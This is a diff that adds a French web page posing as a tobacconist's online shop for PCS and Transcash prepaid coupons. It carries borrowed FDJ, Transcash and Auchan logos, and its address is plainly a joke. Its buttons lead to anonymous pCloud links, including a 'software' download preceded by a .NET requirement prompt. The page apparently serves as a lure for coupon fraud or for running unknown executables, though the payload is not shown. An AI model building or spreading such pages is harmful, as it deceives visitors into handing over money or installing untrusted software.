@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bureau-de-Tabac–Coupons-en-ligne</title>
+  <style>
+    body {font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; color:#333;}
+    header {background:#b71c1c; color:#fff; padding:20px; text-align:center;}
+    header h1 {margin:0; font-size:28px;}
+    nav {margin-top:10px;}
+    nav a {color:#fff; text-decoration:none; margin:0 15px; font-weight:bold;}
+    nav a:hover {text-decoration:underline;}
+    .container {max-width:1000px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1);}
+    
+    /* Section hero */
+    .hero {
+      display:flex;
+      flex-wrap:wrap;
+      align-items:center;   /* centre verticalement l'image par rapport au texte */
+      justify-content:space-between;
+    }
+    .hero-text {flex:1; min-width:280px; margin-right:20px;}
+    .hero-text h2 {color:#b71c1c;}
+    .hero-image {flex:0 0 200px; display:flex; justify-content:center; align-items:center;} /* image centrée verticalement */
+    .hero-image img {max-width:200px; width:100%; height:auto; border-radius:10px;}
+    
+    /* Boutons */
+    .btn {display:inline-block; margin:10px 5px; padding:12px 20px; background:#b71c1c; color:#fff; border-radius:6px; text-decoration:none; font-weight:bold; transition:background 0.3s;}
+    .btn:hover {background:#8a1111;}
+    
+    /* Logos */
+    .logos {margin-top:20px; display:flex; flex-wrap:wrap; justify-content:center; gap:15px;}
+    .logos img {height:50px; object-fit:contain;}
+    
+    /* Footer et alert */
+    footer {background:#333; color:#fff; text-align:center; padding:15px; margin-top:30px;}
+    .alert-net {margin-top:15px; padding:10px; background:#ffebee; border:1px solid #b71c1c; color:#b71c1c; font-weight:bold; border-radius:6px;}
+    
+    /* Responsive pour mobile */
+    @media(max-width:768px){
+      .hero {flex-direction:column;}
+      .hero-text {margin-right:0; margin-bottom:20px;}
+      .hero-image {flex:1;}
+    }
+  </style>
+  <script>
+    const liensPcloud = {
+      pcs: "https://e.pcloud.link/publink/show?code=XZy1oEZsJM4uTpP5wbO9NAWWbxOjjkNSWFy",
+      transcash: "https://e.pcloud.link/publink/show?code=XZlTcEZa8WH9iH6I40X6TOQtU61THfm0kpV",
+      logiciel: "https://e.pcloud.link/publink/show?code=XZa0kOZplQb7YgVrNfmrlqYBkEKzhcP7M7X"
+    };
+
+    function checkNetFramework() {
+      alert("Assurez-vous d’avoir installé .NET Framework 4.8 ou plus pour exécuter ce logiciel.");
+      window.location.href = liensPcloud.logiciel;
+    }
+  </script>
+</head>
+<body>
+  <header>
+    <h1>💨 Bureau-de-Tabac–Coupons-en-ligne</h1>
+    <nav>
+      <a href="#">Accueil</a>
+      <a href="#">Coupons PCS</a>
+      <a href="#">Coupons Transcash</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <section class="hero">
+      <div class="hero-text">
+        <h2>Bienvenue — Bureau-de-Tabac-Camelto25</h2>
+        <p>Espace numérique — récupérez vos coupons et recharges en toute sécurité.</p>
+        <p><strong>145 rue Triangle des Bermudes, 25000 du côté obscur de la force • Ouvert 9h - Minuit</strong></p>
+
+        <a href="#" class="btn" onclick="window.open(liensPcloud.pcs,'_blank')">T-Pcs</a>
+        <a href="#" class="btn" style="background:#4caf50;" onclick="window.open(liensPcloud.transcash,'_blank')">T-Transcash</a>
+
+        <div class="alert-net">
+          ⚠️ Ce logiciel nécessite .NET Framework 4.8 ou plus.<br>
+          <a href="https://dotnet.microsoft.com/en-us/download/dotnet-framework" target="_blank">Télécharger .NET Framework</a>
+        </div>
+
+        <button class="btn" onclick="checkNetFramework()">📥 Télécharger le logiciel</button>
+
+        <div class="logos">
+          <img src="https://zupimages.net/up/25/34/logo-fdj.png" alt="Logo FDJ">
+          <img src="https://zupimages.net/up/25/34/logo-transcash.png" alt="Logo Transcash">
+          <img src="https://zupimages.net/up/25/34/logo-pcs.png" alt="Logo PCS">
+          <img src="https://zupimages.net/up/25/34/presse.png" alt="Logo Presse">
+          <img src="https://zupimages.net/up/25/34/presse-tabac.png" alt="Logo Presse Tabac">
+          <img src="https://zupimages.net/up/25/34/auchan.png" alt="Logo Auchan">
+        </div>
+      </div>
+
+      <div class="hero-image">
+        <img src="https://zupimages.net/up/25/34/ewib.png" alt="tabac-paiement-en-ligne">
+      </div>
+    </section>
+  </div>
+
+  <footer>
+    <p>&copy; 2025 Bureau de Tabac Camelto25 – Tous droits réservés</p>
+  </footer>
+</body>
+</html>
